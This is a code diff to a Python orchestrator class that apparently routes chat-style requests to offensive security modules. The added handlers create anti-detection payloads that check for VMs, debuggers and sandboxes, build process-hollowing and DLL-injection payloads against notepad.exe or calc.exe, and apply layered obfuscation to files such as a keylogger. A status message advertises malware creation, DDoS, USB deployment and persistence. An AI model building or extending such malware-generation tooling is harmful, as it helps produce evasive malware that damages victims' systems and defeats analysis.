@@ -10,6 +10,9 @@ from cybersecurity.malware_expansion import ExpandedMalwareLab
 from cybersecurity.usb_integration import USBIntegration
 from cybersecurity.persistence_mechanisms import PersistenceMechanisms
 from cybersecurity.evasion_techniques import EvasionTechniques
+from cybersecurity.anti_detection import AntiDetection
+from cybersecurity.process_injection import ProcessInjection
+from cybersecurity.advanced_obfuscation import AdvancedObfuscator
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
 from prompts.specialists import SECURITY_PRIVACY_PROMPT
 import config_pi as config
@@ -26,6 +29,9 @@ class EnhancedCybersecurityOrchestrator:
         self.usb_integration = USBIntegration()
         self.persistence = PersistenceMechanisms()
         self.evasion = EvasionTechniques()
+        self.anti_detection = AntiDetection()
+        self.process_injection = ProcessInjection()
+        self.advanced_obfuscator = AdvancedObfuscator()
         self.nlp = ImprovedNLP()
         self.authorization = EnhancedAuthorization()
         self.reporter = VSOCReporter()
@@ -61,6 +67,18 @@ class EnhancedCybersecurityOrchestrator:
         # Evasion
         if any(word in request_lower for word in ["evade", "stealth", "obfuscate", "hide"]):
             return self._handle_evasion(request)
+        
+        # Anti-detection
+        if any(word in request_lower for word in ["anti", "detect", "vm", "debugger", "sandbox"]):
+            return self._handle_anti_detection(request)
+        
+        # Process injection
+        if any(word in request_lower for word in ["inject", "process", "dll", "hollow"]):
+            return self._handle_process_injection(request)
+        
+        # Advanced obfuscation
+        if any(word in request_lower for word in ["fully obfuscate", "multi layer", "advanced obfuscate"]):
+            return self._handle_advanced_obfuscation(request)
         
         # Scanning
         if any(word in request_lower for word in ["scan", "nmap", "vulnerability"]):
@@ -337,4 +355,73 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, scanning, reporting."
+    
+    def _handle_anti_detection(self, request: str) -> str:
+        """Handle anti-detection requests"""
+        request_lower = request.lower()
+        
+        # Check for VM/debugger/sandbox detection
+        if "detect vm" in request_lower or "check vm" in request_lower:
+            result = self.anti_detection.detect_vm()
+            return f"VM Detection: {'Detected' if result['is_vm'] else 'Not detected'}. Indicators: {', '.join(result['indicators']) if result['indicators'] else 'None'}"
+        
+        elif "detect debugger" in request_lower:
+            result = self.anti_detection.detect_debugger()
+            return f"Debugger: {'Detected' if result['debugger_detected'] else 'Not detected'}. Methods: {', '.join(result['methods']) if result['methods'] else 'None'}"
+        
+        elif "detect sandbox" in request_lower:
+            result = self.anti_detection.detect_sandbox()
+            return f"Sandbox: {'Detected' if result['sandbox_detected'] else 'Not detected'}. Indicators: {', '.join(result['indicators']) if result['indicators'] else 'None'}"
+        
+        # Create anti-detection payload
+        elif "anti detection" in request_lower or "anti detect" in request_lower:
+            # Extract payload path
+            import re
+            path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
+            if path_match:
+                payload_path = path_match.group()
+                result = self.anti_detection.create_anti_detection_payload(payload_path)
+                return f"Created anti-detection payload: {result['file']}. Features: {', '.join(result['features'])}. {result['warning']}"
+            return "Specify payload path. Example: 'Create anti-detection version of keylogger.py'"
+        
+        return "Anti-detection commands: detect VM, detect debugger, detect sandbox, create anti-detection payload"
+    
+    def _handle_process_injection(self, request: str) -> str:
+        """Handle process injection requests"""
+        request_lower = request.lower()
+        
+        if "process hollow" in request_lower or "hollow" in request_lower:
+            # Extract target process
+            target = "notepad.exe"  # Default
+            if "notepad" in request_lower:
+                target = "notepad.exe"
+            elif "calc" in request_lower:
+                target = "calc.exe"
+            
+            result = self.process_injection.create_process_hollowing(target)
+            if result.get("error"):
+                return f"Error: {result['error']}"
+            return f"Created process hollowing payload: {result['file']}. Target: {result['target']}. {result['warning']}"
+        
+        elif "dll inject" in request_lower:
+            result = self.process_injection.create_dll_injection("1234", "payload.dll")
+            if result.get("error"):
+                return f"Error: {result['error']}"
+            return f"Created DLL injection payload: {result['file']}. {result['warning']}"
+        
+        return "Process injection: process hollowing, DLL injection"
+    
+    def _handle_advanced_obfuscation(self, request: str) -> str:
+        """Handle advanced obfuscation requests"""
+        import re
+        path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
+        if not path_match:
+            return "Specify payload path. Example: 'Fully obfuscate keylogger.py'"
+        
+        payload_path = path_match.group()
+        if not os.path.exists(payload_path):
+            return f"Payload not found: {payload_path}"
+        
+        result = self.advanced_obfuscator.create_fully_obfuscated(payload_path)
+        return f"Created fully obfuscated payload: {result['obfuscated']}. Layers: {result['layers']}. {result['warning']}"
